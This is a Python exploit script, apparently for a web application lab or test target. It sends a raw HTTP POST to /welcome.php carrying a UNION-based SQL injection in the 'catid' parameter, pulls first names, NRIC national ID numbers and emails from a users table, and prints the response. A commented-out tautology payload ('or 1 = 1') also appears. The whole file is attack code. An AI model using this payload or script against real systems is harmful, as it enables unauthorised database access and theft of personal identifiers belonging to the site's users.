#!/usr/bin/python3


import sys
from socket import *

payload="catid=1000+union+select+firstname%2C+nric%2C+email+from+users+LIMIT+7%2C+100"

#payload="catid=' or 1 = 1 ; --"

if __name__ == "__main__" :
   if len(sys.argv) != 2:
      print("Usage: python3 " , sys.argv[0] , "[host:port]")
      sys.exit(1)

   parts = sys.argv[1]
   parts = parts.split(":")
  
   if len(parts) != 2:
      print("Invalid host:port format")
      sys.exit(1)

   host = parts[0]
   port = parts[1]
   port = int(port)

   sdata =("POST /welcome.php HTTP/1.1\r\n" +
           "User-Agent: Python3 Socket\r\n" +
           "Content-Type: application/x-www-form-urlencoded\r\n" +
           "Content-Length: " + str(len(payload)) + "\r\n" +
           "Host: " + host + ":" + str(port) + "\r\n\r\n" +
           payload)


   sock = socket(AF_INET, SOCK_STREAM)
   sock.connect((host, port))

   sock.sendall(sdata.encode('utf-8'))
   content = sock.recv(8192)
   sock.close()

   print(content.decode('utf-8'))
    

   



